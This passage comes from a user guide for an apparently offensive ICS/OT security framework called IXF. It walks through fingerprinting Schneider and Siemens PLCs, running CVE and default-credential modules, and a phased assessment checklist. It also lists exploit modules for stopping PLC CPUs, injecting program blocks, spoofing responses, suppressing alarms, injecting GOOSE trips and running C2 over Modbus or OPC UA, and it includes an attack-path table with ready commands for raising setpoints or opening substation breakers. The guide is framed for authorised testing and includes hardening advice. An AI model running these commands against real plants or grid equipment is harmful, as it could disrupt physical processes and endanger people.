  [+] ProductCode:      TM221CE16T
  [+] MajorMinorRevision: V1.5.4
  Identified: Schneider Electric Modicon TM221 (M221 PLC)

# For unknown at 192.168.1.100 (S7comm)
ixf > use exploits/protocols/s7comm/s7_read_system_info
ixf [s7_read_system_info] > set target 192.168.1.100
ixf [s7_read_system_info] > run

  [+] CPU Type: S7-1516-3 PN/DP
  [+] Firmware: V2.8.3
  Identified: Siemens S7-1500 family (1516 CPU)
```

### Step 3: Search for Applicable Modules

```
# Search by vendor name
ixf > search schneider
  cve/schneider/cve_2021_22763_ecostruxure_auth_bypass
  cve/schneider/cve_2022_37300_modicon_m340_rce
  cve/schneider/cve_2018_7789_modicon_m340_auth_bypass
  cve/schneider/cve_2019_6857_modicon_restart
  creds/schneider/tm221_default_passwords
  creds/schneider/ecostruxure_web_default
  ... [35 more modules]

# Search by product name
ixf > search TM221
  cve/schneider/cve_2019_6857_modicon_m221_restart
  creds/schneider/tm221_default_passwords
  assessment/mitre_ics/t0859_valid_accounts

# Search by CVE number
ixf > search CVE-2021-22763
  cve/schneider/cve_2021_22763_ecostruxure_auth_bypass
```

### Step 4: Check Default Credentials

```
# Check if default credentials apply
ixf > use creds/schneider/tm221_default_passwords
ixf [tm221_default_passwords] > set target 192.168.1.50
ixf [tm221_default_passwords] > run

  [*] Testing 6 known default credential sets for Schneider TM221...
  [SIMULATE] Would test:
    admin / (empty)
    USER / USER
    ADMIN / ADMIN
    admin / admin
    ... [2 more]
  MITRE: T0812 (Default Credentials), T0859 (Valid Accounts)
```

### Step 5: Run Applicable CVE Modules

```
ixf > use cve/schneider/cve_2021_22763_ecostruxure_auth_bypass
ixf [cve_2021_22763_ecostruxure_auth_bypass] > set target 192.168.1.50
ixf [cve_2021_22763_ecostruxure_auth_bypass] > run

  [SIMULATE] CVE-2021-22763: Schneider EcoStruxure Authentication Bypass
  ...
```

### Step 6: Run MITRE Technique Sweep for the Identified Vendor

```
# Run all Initial Access modules against identified Schneider device
ixf > ttp T0819 192.168.1.50

# Or run the full discovery-through-lateral-movement sweep
ixf > mitre-scan initial-access 192.168.1.50
```

---

## Adding a New Vendor

When IXF does not yet have modules for a specific vendor, you can contribute coverage using the module development API (see [Module Development](09-module-development.md) for the full guide). This section provides a quick-start workflow.

### Step 1: Research the Vendor's Protocol

Most ICS vendors use one or more standard protocols (Modbus, EtherNet/IP, OPC UA) plus proprietary extensions. Start by checking whether a standard protocol scanner already covers the device:

```
# Can the generic Modbus scanner reach it?
ixf > use scanners/ics/modbus_scanner
ixf [modbus_scanner] > set target <new_device_ip>
ixf [modbus_scanner] > run

# Can the EtherNet/IP scanner see it?
ixf > use scanners/ics/enip_scanner
ixf [enip_scanner] > set target <new_device_ip>
ixf [enip_scanner] > run
```

### Step 2: Create the Vendor Directory

```
industrialxpl/modules/cve/<vendor_name>/
industrialxpl/modules/creds/<vendor_name>/
industrialxpl/modules/scanners/ics/  (shared directory)
```

### Step 3: Create the First Module

```python
# industrialxpl/modules/creds/new_vendor/new_vendor_default_passwords.py

from industrialxpl.core.module import BaseModule
from industrialxpl.core.result import ModuleResult

class NewVendorDefaultPasswords(BaseModule):
    """Default credential check for NewVendor devices."""

    name        = "creds/new_vendor/new_vendor_default_passwords"
    description = "Test known default credentials for NewVendor PLC web interface"
    author      = "mrhenrike"
    vendor      = "NewVendor"
    product     = "NV-5000 PLC Series"
    mitre_ids   = ["T0812", "T0859"]

    DEFAULT_CREDENTIALS = [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "password"),
        ("user", "user"),
        ("engineer", "engineer"),
    ]

    options = {
        "target":   {"required": True,  "description": "Target device IP"},
        "port":     {"default": 80,     "description": "HTTP port"},
        "timeout":  {"default": 5,      "description": "Connection timeout"},
    }

    def run(self) -> ModuleResult:
        target  = self.options["target"]
        port    = self.options["port"]
        timeout = self.options["timeout"]

        if self.simulate:
            return ModuleResult.simulate(
                f"Would test {len(self.DEFAULT_CREDENTIALS)} credential sets "
                f"against {target}:{port}/login"
            )

        for username, password in self.DEFAULT_CREDENTIALS:
            result = self._try_credential(target, port, username, password, timeout)
            if result.success:
                return ModuleResult.success(
                    f"Default credential accepted: {username}:{password}",
                    credential={"username": username, "password": password}
                )

        return ModuleResult.not_vulnerable("No default credentials accepted")
```

### Step 4: Register the Module

```python
# industrialxpl/modules/creds/new_vendor/__init__.py
from .new_vendor_default_passwords import NewVendorDefaultPasswords

__all__ = ["NewVendorDefaultPasswords"]
```

### Step 5: Test in IXF

```
ixf > reload
ixf > search new_vendor
  creds/new_vendor/new_vendor_default_passwords

ixf > use creds/new_vendor/new_vendor_default_passwords
ixf [new_vendor_default_passwords] > set target 192.168.1.99
ixf [new_vendor_default_passwords] > run

  [SIMULATE] Would test 5 credential sets against 192.168.1.99:80/login
  MITRE: T0812 (Default Credentials), T0859 (Valid Accounts)
```

### Step 6: Contribute Back

If the module covers a real CVE or a novel attack surface, consider contributing it to the IXF repository. Follow the contribution guidelines in [CONTRIBUTING.md](../../CONTRIBUTING.md) — all contributions must be submitted with:
- CVE or advisory reference (if applicable)
- Test environment description
- Simulate mode that returns no live traffic

---

## Protocol Security Assessment Checklist

Use this checklist when performing an ICS/OT security assessment. Run each IXF command against the in-scope network and record findings in the assessment report.

### Phase 1: Network Discovery

```bash
# 1. Discover all ICS devices on the subnet
ixf > use scanners/ics/ics_network_mapper
ixf > set target 10.0.0.0/24
ixf > run

# 2. PROFINET DCP scan (L2 — requires direct LAN access)
ixf > use scanners/ics/profinet_dcp_scan
ixf > set interface eth0
ixf > run

# 3. BACnet/IP discovery (UDP broadcast)
ixf > use exploits/protocols/bacnet/bacnet_who_is
ixf > set target 10.0.0.255
ixf > run

# 4. OPC UA endpoint discovery
ixf > use scanners/ics/opcua_discovery
ixf > set target 10.0.0.0/24
ixf > run

# 5. DNP3 data link layer scan
ixf > use scanners/ics/dnp3_data_link_scan
ixf > set target 10.0.0.0/24
ixf > run

# 6. Shodan lookup for internet-exposed devices
ixf > use scanners/ics/shodan_ics_lookup
ixf > set org "Target Organization Name"
ixf > run
```

### Phase 2: Authentication Assessment

```bash
# Check default credentials — all vendors detected in Phase 1
ixf > ttp T0812 10.0.0.100       # Default Credentials sweep
ixf > ttp T0859 10.0.0.100       # Valid Accounts sweep (37 vendor modules)

# Check OPC UA anonymous access
ixf > use exploits/protocols/opcua/opcua_browse_address_space
ixf > set target 10.0.0.100
ixf > run

# Check Modbus write access (no auth required by design)
ixf > use exploits/protocols/modbus/modbus_write_holding_register
ixf > set target 10.0.0.100
ixf > set register 0
ixf > set value 0         # Write 0 — safe test value
ixf > run

# Check S7comm without password
ixf > use exploits/protocols/s7comm/s7_read_system_info
ixf > set target 10.0.0.100
ixf > run
```

### Phase 3: Protocol-Specific Security

```bash
# Modbus: check if write registers is permitted
ixf > use exploits/protocols/modbus/modbus_read_all_registers
ixf > set target 10.0.0.100
ixf > run

# S7comm: check CPU mode and SZL info
ixf > use exploits/protocols/s7comm/s7_read_cpu_mode
ixf > set target 10.0.0.100
ixf > run

# EtherNet/IP: Identity Object read
ixf > use exploits/protocols/enip/enip_list_identity
ixf > set target 10.0.0.100
ixf > run

# DNP3: SAv5 security check
ixf > use assessment/mitre_ics/t0855_unauthorized_command
ixf > set target 10.0.0.100
ixf > run

# OPC UA: Security mode check
ixf > use exploits/protocols/opcua/opcua_read_server_info
ixf > set target 10.0.0.100
ixf > run

# BACnet: Write property test
ixf > use exploits/protocols/bacnet/bacnet_write_property
ixf > set target 10.0.0.110
ixf > run
```

### Phase 4: CVE-Based Vulnerability Assessment

```bash
# Run all Initial Access CVE modules for identified vendors
ixf > mitre-scan initial-access 10.0.0.100

# Run specific vendor CVE modules
ixf > search siemens     # list all Siemens modules
ixf > search schneider   # list all Schneider modules
ixf > search rockwell    # list all Rockwell modules

# Run MITRE technique sweep for the full target network
ixf > mitre-all 10.0.0.100
```

### Phase 5: Report Generation

```bash
# Generate MITRE Navigator layer
ixf > mitre-report layer

# Generate HTML assessment report
ixf > mitre-report html --output /opt/reports/assessment_20260601.html

# Run SAST on captured PLC programs
ixf > llm-key gemini <api_key>
ixf > sast /opt/captured_programs/ --mode sast

# Export all results
ixf > mitre-report json --output /opt/reports/coverage_20260601.json
```

---

## Protocol Exploit Module Reference

Complete listing of exploit module paths by protocol family:

### Modbus Protocol Family

| Module | Function | MITRE |
|--------|----------|-------|
| `exploits/protocols/modbus/modbus_scanner` | Device discovery | T0846 |
| `exploits/protocols/modbus/modbus_device_id` | Vendor/model ID (FC43) | T0888 |
| `exploits/protocols/modbus/modbus_read_all_registers` | Read all HRs (T0802) | T0802 |
| `exploits/protocols/modbus/modbus_coil_register_map` | Map coils and registers | T0861 |
| `exploits/protocols/modbus/modbus_write_holding_register` | Write single register (FC06) | T0836 |
| `exploits/protocols/modbus/modbus_write_multiple_registers` | Write block (FC16) | T0836 |
| `exploits/protocols/modbus/modbus_coil_flip` | Toggle binary output (FC05) | T0831 |
| `exploits/protocols/modbus/modbus_broadcast_flood` | Flood broadcast (DoS) | T0814 |
| `exploits/protocols/modbus/modbus_rogue_master` | Rogue Modbus master | T0848 |
| `exploits/protocols/modbus/modbus_read_intercept` | Intercept read replies | T0832 |
| `exploits/protocols/modbus/modbus_report_spoof` | Spoof Modbus responses | T0856 |
| `exploits/protocols/modbus/modbus_alarm_setpoint_write` | Write alarm thresholds | T0833 |
| `exploits/protocols/modbus/modbus_write_alarm_suppression_coil` | Suppress alarm coil | T0878 |
| `exploits/protocols/modbus/modbus_io_brute_force` | Brute force coil states | T0806 |
| `exploits/protocols/modbus/modbus_logger` | Passive Modbus logger | T0802 |
| `exploits/protocols/modbus/modbus_command_block` | Block command messages | T0803 |
| `exploits/protocols/modbus/modbus_c2_channel` | C2 over Modbus | T0870 |

### S7comm Protocol Family

| Module | Function | MITRE |
|--------|----------|-------|
| `exploits/protocols/s7comm/s7_plc_program_upload_download` | Program download/upload | T0843, T0844 |
| `exploits/protocols/s7comm/s7_cpu_stop_command` | CPU STOP command | T0816 |
| `exploits/protocols/s7comm/s7_read_szl_list` | Read system status list | T0877 |
| `exploits/protocols/s7comm/s7_write_db_block` | Write data block | T0836 |
| `exploits/protocols/s7comm/s7_read_system_info` | Read CPU info | T0888 |
| `exploits/protocols/s7comm/s7_change_plc_password` | Change PLC password | T0858 |
| `exploits/protocols/s7comm/s7_ob1_inject` | OB1 program block injection | T0838 |
| `exploits/protocols/s7comm/s7_firmware_update_mode` | Activate FW update mode | T0800 |
| `exploits/protocols/s7comm/s7_force_program_state` | Force CPU run/stop/reset | T0875 |
| `exploits/protocols/s7comm/s7_io_image_read` | Read I/O process image | T0824 |
| `exploits/protocols/s7comm/s7_native_api_call` | Native API execution | T0834 |
| `exploits/protocols/s7comm/s7_read_cpu_mode` | Read run/stop/hold mode | T0835 |
| `exploits/protocols/s7comm/s7_db_exfil` | Exfiltrate DB blocks | T0882 |
| `exploits/protocols/s7comm/s7_pou_enum` | Enumerate Program Org Units | T0845 |
| `exploits/protocols/s7comm/s7_scl_exec` | Execute SCL script | T0853 |
| `exploits/protocols/s7comm/s7_modify_task_scheduler` | Modify task scheduling | T0821 |
| `exploits/protocols/s7comm/s7_remote_service_enum` | Enumerate remote services | T0807 |
| `exploits/protocols/s7comm/s7_tool_transfer` | Lateral tool transfer | T0867 |

### EtherNet/IP (CIP) Protocol Family

| Module | Function | MITRE |
|--------|----------|-------|
| `exploits/protocols/enip/enip_list_identity` | List identity objects | T0846 |
| `exploits/protocols/enip/enip_get_attribute_all` | Get all attributes | T0888 |
| `exploits/protocols/enip/enip_forward_open_flood` | I/O connection flood | T0814 |
| `exploits/protocols/enip/enip_reset_identity` | Reset device | T0816 |
| `exploits/protocols/enip/enip_program_download_controllogix` | Download ladder logic | T0843 |
| `exploits/protocols/enip/enip_program_upload` | Upload PLC program | T0844 |
| `exploits/protocols/enip/enip_write_tag` | Write named tag | T0836 |
| `exploits/protocols/enip/enip_cip_native_api` | CIP native API call | T0834 |
| `exploits/protocols/enip/enip_run_stop_control` | Run/Stop controller | T0875 |
| `exploits/protocols/enip/enip_list_services` | Enumerate CIP services | T0888 |
| `exploits/protocols/enip/enip_pou_list` | List Program Org Units | T0845 |
| `exploits/protocols/enip/enip_cip_api_exec` | CIP API execution | T0871 |
| `exploits/protocols/enip/enip_read_controller_mode` | Read controller mode | T0835 |
| `exploits/protocols/enip/enip_cip_motion_config` | Motion axis configuration | T0821 |

### DNP3 Protocol Family

| Module | Function | MITRE |
|--------|----------|-------|
| `exploits/protocols/dnp3/dnp3_direct_operate` | Direct Operate control | T0855 |
| `exploits/protocols/dnp3/dnp3_direct_operate_unauth` | Direct Operate (no SAv5) | T0855 |
| `exploits/protocols/dnp3/dnp3_unsolicited_response_disable` | Disable unsolicited msgs | T0803 |
| `exploits/protocols/dnp3/dnp3_warm_restart` | Warm restart RTU | T0816 |
| `exploits/protocols/dnp3/dnp3_cold_restart` | Cold restart RTU | T0816 |
| `exploits/protocols/dnp3/dnp3_data_link_scan` | Data link layer scan | T0840 |
| `exploits/protocols/dnp3/dnp3_rogue_master` | Rogue DNP3 master | T0848 |
| `exploits/protocols/dnp3/dnp3_response_spoof` | Spoof DNP3 responses | T0856 |
| `exploits/protocols/dnp3/dnp3_data_poller` | Automated data polling | T0802 |
| `exploits/protocols/dnp3/dnp3_control_block` | Block control messages | T0803 |
| `exploits/protocols/dnp3/dnp3_response_drop` | Drop reporting messages | T0804 |

### OPC UA Protocol Family

| Module | Function | MITRE |
|--------|----------|-------|
| `exploits/protocols/opcua/opcua_browse_address_space` | Browse all nodes | T0861 |
| `exploits/protocols/opcua/opcua_read_server_info` | Read server endpoint info | T0888 |
| `exploits/protocols/opcua/opcua_write_value_anon` | Write node value (anon) | T0836 |
| `exploits/protocols/opcua/opcua_subscribe_all` | Subscribe all data | T0801 |
| `exploits/protocols/opcua/opcua_historian_read` | Read historian data | T0811 |
| `exploits/protocols/opcua/opcua_alarm_acknowledge_flood` | Flood alarm acks | T0878 |
| `exploits/protocols/opcua/opcua_alarm_deadband_modify` | Modify alarm deadband | T0833 |
| `exploits/protocols/opcua/opcua_method_call` | Call exposed method | T0871 |
| `exploits/protocols/opcua/opcua_user_modify` | Modify OPC UA user | T0858 |
| `exploits/protocols/opcua/opcua_hmi_screenshot` | Capture HMI screen | T0852 |
| `exploits/protocols/opcua/opcua_recipe_dump` | Dump process recipes | T0882 |
| `exploits/protocols/opcua/opcua_value_spoof` | Spoof node values | T0832 |
| `exploits/protocols/opcua/opcua_c2_tunnel` | C2 tunnel over OPC UA | T0869 |
| `exploits/protocols/opcua/opcua_discovery` | Find all endpoints | T0846 |

### IEC 61850 Protocol Family

| Module | Function | MITRE |
|--------|----------|-------|
| `exploits/protocols/iec61850/goose_injection` | GOOSE trip injection (L2) | T0855 |
| `exploits/protocols/iec61850/mms_read_dataset` | MMS Read Dataset | T0802 |
| `exploits/protocols/iec61850/mms_write_control` | MMS Write control block | T0831 |
| `exploits/protocols/iec61850/goose_replay` | Replay captured GOOSE | T0855 |
| `exploits/protocols/iec61850/sv_injection` | Sampled Values injection | T0832 |
| `exploits/protocols/iec61850/mms_enum_logical_nodes` | Enumerate logical nodes | T0861 |
| `assessment/protocols/iec61850/iec61850_security_audit` | IEC 61850 security audit | T0840 |

---

## Credential Module Reference

All default credential modules follow the path `creds/<vendor>/<vendor>_default_passwords`. Tested credential types include: web interfaces, engineering software, SSH/Telnet, serial console, OPC UA, and vendor-specific protocols.

| Vendor | Module Path | Tested Systems | Credential Types |
|--------|-------------|----------------|-----------------|
| Siemens | `creds/siemens/s7_default_passwords` | S7-300/400/1200/1500, WinCC | S7comm, WinCC web, SSH |
| Schneider | `creds/schneider/modicon_default_passwords` | M340/M580/Quantum, EcoStruxure | Modbus, Web, FTP |
| Rockwell | `creds/rockwell/factorytalk_default_passwords` | FactoryTalk, Studio 5000 | FactoryTalk, EtherNet/IP |
| Honeywell | `creds/honeywell/experion_default_passwords` | Experion PKS, Spyder | C300 web, SCADA |
| GE | `creds/ge/cimplicity_default_passwords` | CIMPLICITY, iFIX, RX3i | Web, GE SRTP |
| ABB | `creds/abb/system800xa_default_passwords` | System 800xA, AC500 | Web, OPC UA |
| Emerson | `creds/emerson/deltav_default_passwords` | DeltaV, ROC800 | Web, Telnet |
| Omron | `creds/omron/sysmac_default_passwords` | NX/NJ, CJ2M, CP | FINS, Web, CIP |
| Yokogawa | `creds/yokogawa/centum_default_passwords` | CENTUM VP, STARDOM | Vnet/IP, Web |
| Mitsubishi | `creds/mitsubishi/melsec_default_passwords` | iQ-R/Q, GOT | SLMP, Web, Telnet |
| Beckhoff | `creds/beckhoff/twincat_default_passwords` | TwinCAT, CX-series | ADS, Web |
| Delta | `creds/delta/diaenergie_default_passwords` | DIAEnergie, AS-series | Modbus, Web |
| Inductive | `creds/inductive/ignition_default_passwords` | Ignition SCADA 8.x | Web, OPC UA |
| Tridium | `creds/tridium/niagara_default_passwords` | Niagara 4, JACE 8000 | BACnet, Web |
| Advantech | `creds/advantech/webaccess_default_passwords` | WebAccess 9.x | Web, OPC DA |
| WEG | `creds/weg/cfw11_default_passwords` | CFW-11/CFW-21 VFD | Web, Modbus |
| ALTUS | `creds/altus/duo_default_passwords` | Duo PLC, Nexto Xpress | Web, Modbus |
| Weintek | `creds/weintek/cmt_default_passwords` | cMT HMI, EasyAccess | Web, Modbus |
| Delta Controls | `creds/delta_controls/orcaview_default_passwords` | ORCAview BAS | BACnet, Web |
| Saia-Burgess | `creds/saia/pcd_default_passwords` | PCD1/PCD3 | Web, S-Bus |

---

## Scanner Module Reference

All scanner modules are safe by default (simulate=True). They perform discovery and fingerprinting without sending exploit payloads.

| Module | Protocol | Target | MITRE |
|--------|----------|--------|-------|
| `scanners/ics/ics_network_mapper` | Multi-protocol | Subnet | T0846 |
| `scanners/ics/modbus_scanner` | Modbus TCP | Subnet/host | T0840 |
| `scanners/ics/enip_scanner` | EtherNet/IP | Subnet/host | T0840 |
| `scanners/ics/s7_comm_scanner` | S7comm | Subnet/host | T0846 |
| `scanners/ics/profinet_dcp_scan` | PROFINET | L2 LAN | T0842 |
| `scanners/ics/bacnet_discovery` | BACnet/IP | Subnet broadcast | T0846 |
| `scanners/ics/dnp3_data_link_scan` | DNP3 | Subnet/host | T0840 |
| `scanners/ics/iec104_scan` | IEC 104 | Subnet/host | T0840 |
| `scanners/ics/opcua_discovery` | OPC UA | Subnet/host | T0846 |
| `scanners/ics/omron_fins_scan` | FINS | Subnet/host | T0846 |
| `scanners/ics/modbus_device_id` | Modbus FC43 | Host | T0888 |
| `scanners/ics/modbus_coil_register_map` | Modbus | Host | T0861 |
| `scanners/ics/opcua_browse_address_space` | OPC UA | Host | T0861 |
| `scanners/ics/ics_protocol_fingerprint` | Multi | Host | T0842 |
| `scanners/ics/passive_banner_grab` | TCP | Subnet | T0841 |
| `scanners/ics/serial_rs485_scan` | RS-485 | Serial port | T0854 |
| `scanners/ics/serial_modbus_rtu_probe` | Modbus RTU | Serial port | T0854 |
| `scanners/ics/snmp_topology_walk` | SNMP | Subnet | T0842 |
| `scanners/ics/lldp_collector` | LLDP | L2 LAN | T0842 |
| `scanners/ics/ics_external_exposure_check` | Multi | External | T0883 |
| `scanners/ics/shodan_ics_lookup` | Shodan API | External | T0883 |
| `scanners/ics/censys_ics_lookup` | Censys API | External | T0883 |
| `scanners/ics/fofa_ics_lookup` | FOFA API | External | T0883 |
| `scanners/ics/ics_banner_fingerprint` | TCP | Subnet | T0883 |

---

## Protocol Security Comparison

The table below summarizes the security posture of each major protocol, helping prioritize remediation efforts:

| Protocol | Auth (Native) | Encryption (Native) | Integrity | Replay Protection | IXF Attack Modules |
|----------|--------------|---------------------|-----------|-------------------|-------------------|
| Modbus TCP | None | None | None | None | 17 |
| Siemens S7comm | None | None | None | None | 18 |
| Siemens S7comm+ | Optional cert | TLS (hardcoded key) | TLS | TLS | 5 |
| EtherNet/IP (CIP) | Optional (Level 1-3) | None (CIP Security optional) | None | None | 14 |
| DNP3 | SAv5 (optional, rare) | None | HMAC (SAv5 only) | SAv5 only | 11 |
| BACnet/IP | None | None | None | None | 7 |
| BACnet/SC | X.509 cert | TLS | TLS | TLS | 1 |
| IEC 60870-5-104 | None | IEC 62351 (optional) | IEC 62351 | IEC 62351 | 5 |
| IEC 61850 MMS | None | IEC 62351-4 (optional) | IEC 62351 | IEC 62351 | 6 |
| IEC 61850 GOOSE | None | None | HMAC (optional) | None | 4 |
| OPC UA | X.509 cert | TLS | TLS | TLS session | 14 |
| OPC DA | Windows DCOM | Windows auth | Windows | Windows | 3 |
| Omron FINS | None | None | None | None | 8 |
| PROFINET DCP | None | None | None | None | 5 |
| PROFINET RT | None | None | None | None | 3 |
| Beckhoff ADS | None (optional ACL) | None | None | None | 4 |
| MQTT | Username/pass (optional) | TLS (optional) | TLS | None | 6 |
| KNX/EIB | None | None | None | None | 2 |

**Key:** Protocols with "None" in Auth+Encryption+Integrity+Replay are fully unauthenticated and unencrypted — any attacker with network access can read, write, and control the device.

---

## Filtering Modules by Protocol or Vendor

IXF's `search` command accepts protocol names, vendor names, CVE IDs, and MITRE technique IDs:

```
# Find all modules for a protocol
ixf > search modbus
ixf > search s7comm
ixf > search bacnet
ixf > search opcua
ixf > search enip

# Find all modules for a vendor
ixf > search siemens
ixf > search schneider
ixf > search rockwell
ixf > search honeywell
ixf > search emerson

# Find modules by CVE
ixf > search CVE-2021-22681
ixf > search CVE-2022-1161
ixf > search CVE-2021-22763

# Find modules by MITRE technique
ixf > search T0836
ixf > search T0819
ixf > search T0843

# Combine filters
ixf > search siemens T0819      # Siemens CVE modules for Initial Access
ixf > search modbus T0836       # Modbus parameter modification modules
ixf > search default_creds      # All credential modules
```

---

## Protocol-Specific Remediation Summary

After running assessments, apply vendor-specific hardening:

| Protocol | Primary Hardening | IXF Assessment Module |
|----------|------------------|----------------------|
| Modbus TCP | Firewall port 502; allowlist engineering workstation IPs; add VPN | `assessment/mitre_ics/t0836_modify_parameter` |
| S7comm | Enable CPU access level 3 (full protection); block port 102 from IT | `assessment/mitre_ics/t0843_program_upload` |
| EtherNet/IP | Enable CIP Security; restrict port 44818; apply Rockwell hardening guide | `assessment/mitre_ics/t0843_program_upload` |
| DNP3 | Deploy DNP3 SAv5; segment RTUs from IT; monitor for unsolicited msgs | `assessment/mitre_ics/t0855_unauthorized_command` |
| BACnet/IP | Migrate to BACnet/SC (ASHRAE 135-2020); VLAN isolate BAS | `assessment/mitre_ics/t0836_modify_parameter` |
| IEC 104 | Deploy IEC 62351-3 (TLS) and IEC 62351-5 (auth); segment RTUs | `assessment/mitre_ics/t0855_unauthorized_command` |
| OPC UA | Set SecurityMode=SignAndEncrypt; certificate-only auth; disable anonymous | `assessment/mitre_ics/t0836_modify_parameter` |
| IEC 61850 GOOSE | Enable GOOSE authentication (IEC 62351-6 HMAC); L2 port security | `assessment/mitre_ics/t0855_unauthorized_command` |
| FINS | Block UDP 9600 from all non-engineering hosts; enable FINS IP filter | `assessment/mitre_ics/t0843_program_upload` |
| PROFINET | Enable PROFINET MRP with authentication; L2 port security/MAC ACL | `assessment/mitre_ics/t0816_device_restart` |
| MQTT | Enable TLS (port 8883); require username+password; ACL per topic | `assessment/mitre_ics/t0869_app_layer_protocol` |

---

## Quick Reference — Common Attack Paths by Protocol

The table below maps the most common real-world attack chains to their IXF execution commands:

| Attack Scenario | Protocol | IXF Command | MITRE Chain |
|----------------|---------|-------------|-------------|
| Read all PLC setpoints | Modbus | `ttp T0802 <ip>` | T0802 → T0836 |
| Raise temperature setpoint | Modbus / OPC UA | `ttp T0836 <ip>` | T0836 → T0879 |
| Stop PLC CPU | S7comm | `use exploits/protocols/s7comm/s7_cpu_stop_command` | T0816 → T0813 |
| Download modified PLC program | S7comm / EtherNet/IP | `ttp T0843 <ip>` | T0843 → T0838 |
| Suppress alarms | DNP3 / OPC UA | `ttp T0878 <ip>` | T0878 → T0879 |
| Open substation breaker | IEC 61850 GOOSE | `use exploits/protocols/iec61850/goose_injection` | T0855 → T0826 |
| Send unauthorized RTU command | DNP3 / IEC 104 | `ttp T0855 <ip>` | T0855 → T0831 |
| Brute force credentials | Multi-protocol | `ttp T0812 <ip>` | T0812 → T0859 |
| Discover all ICS devices | Multi | `mitre-scan discovery <subnet>` | T0840 → T0846 |
| Full red team simulation | Multi | `mitre-all <ip>` | All 12 tactics |
| Write BACnet setpoint (HVAC) | BACnet/IP | `use exploits/protocols/bacnet/bacnet_write_property` | T0836 → T0813 |
| Omron FINS memory write | FINS | `use exploits/protocols/fins/fins_memory_area_write` | T0836 → T0879 |
| Force PROFINET device reset | PROFINET DCP | `use exploits/protocols/profinet/profinet_dcp_reset_factory` | T0816 → T0813 |
| Enumerate OPC UA tags | OPC UA | `use exploits/protocols/opcua/opcua_browse_address_space` | T0861 → T0836 |
| Disable DNP3 unsolicited | DNP3 | `use exploits/protocols/dnp3/dnp3_unsolicited_response_disable` | T0803 → T0830 |

---

## External References

- [MITRE ATT&CK for ICS](https://attack.mitre.org/matrices/ics/) — technique descriptions and real-world examples
- [ICS-CERT Advisories](https://www.cisa.gov/uscert/ics/advisories) — official US government CVE disclosures for industrial systems
- [Claroty Research](https://claroty.com/team82/research) — vulnerability research for ICS/OT vendors
- [Dragos OT Intelligence](https://www.dragos.com/threat-groups/) — threat actor and malware intelligence for ICS
- [S4 Conference](https://s4xevents.com/) — annual ICS security conference
- [DEF CON ICS Village](https://www.icsvillage.com/) — hands-on ICS attack and defense workshops
- [SANS ICS Security](https://www.sans.org/industrial-control-systems-security/) — ICS security training and certifications
- [Nozomi Networks Research](https://www.nozominetworks.com/labs) — protocol vulnerability research
- [Shodan ICS Dashboard](https://www.shodan.io/explore/category/industrial-control-systems) — internet-exposed ICS device search
- [Project Basecamp (Digital Bond)](https://www.digitalbond.com/tools/basecamp/) — foundational ICS protocol research
- [ENISA ICS/SCADA Guidelines](https://www.enisa.europa.eu/publications/guidelines-for-securing-ics) — EU ICS security guidelines
- [NERC CIP Standards](https://www.nerc.com/pa/Stand/Pages/CIPStandards.aspx) — North American power grid cybersecurity standards
- [ISA/IEC 62443](https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards) — industrial cybersecurity standard series
- [NIST SP 800-82 Rev 3](https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final) — NIST guide to ICS security
- [OPC Foundation Security](https://opcfoundation.org/developer-tools/specifications-opc-ua-information-models/opc-unified-architecture/) — OPC UA security model specification
- [IEC 62351 Security](https://tc57.iec.ch/index-tc57.html) — power system communication security standard
- [Modbus Organization](https://modbus.org/specs.php) — official Modbus specification and implementation guides

---

*Previous: [SAST / LLM Analysis](07-sast-llm.md) | Next: [Module Development](09-module-development.md)*
